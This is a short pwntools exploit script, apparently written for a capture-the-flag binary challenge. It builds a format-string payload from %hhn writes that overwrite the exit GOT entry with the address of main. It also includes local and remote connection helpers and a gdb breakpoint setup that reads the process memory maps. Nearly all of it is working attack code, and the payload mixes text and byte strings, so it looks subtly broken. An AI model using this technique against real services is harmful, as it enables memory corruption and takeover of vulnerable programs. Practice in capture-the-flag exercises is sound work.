from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './prob'
HOST = '333.333.333.333'
PORT = 31337

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [])

def aaw(what, where):
	total = 0
	offset = 0
	payload = ''
	for i in range(6):
		c = ((what >> ( i*8 )) -offset) % 0x100
		if c == 0:
			c = 0x100
		payload += "%{}c%{}$hhn".format(c, i+16)
		offset += c
	payload = payload.ljust(0x50, b'\x00')
	for i in range(6):
		payload += p64(where+i)
	payload = payload.ljust(0x100, b'\x00')
	r.send(payload)

aaw(elf.sym.main, elf.got.exit)

r.interactive()
r.close()
